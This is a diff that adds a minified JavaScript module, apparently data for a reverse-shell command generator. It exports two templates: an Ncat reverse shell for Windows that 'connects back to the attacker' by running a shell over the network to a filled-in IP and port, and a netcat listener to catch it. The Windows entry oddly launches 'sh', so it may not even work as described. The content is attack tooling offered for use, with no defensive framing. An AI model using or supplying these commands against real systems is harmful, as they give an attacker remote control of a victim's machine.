@@ -1,0 +1,1 @@
+const e=[{title:"Ncat.exe -e reverse shell (Windows)",template:"ncat.exe {ip} {port} -e sh",description:"Windows Ncat reverse shell that spawns a shell and connects back to the attacker."},{title:"Netcat Listener",template:"nc -lvnp {port}"}],t={commands:e};export{e as commands,t as default};
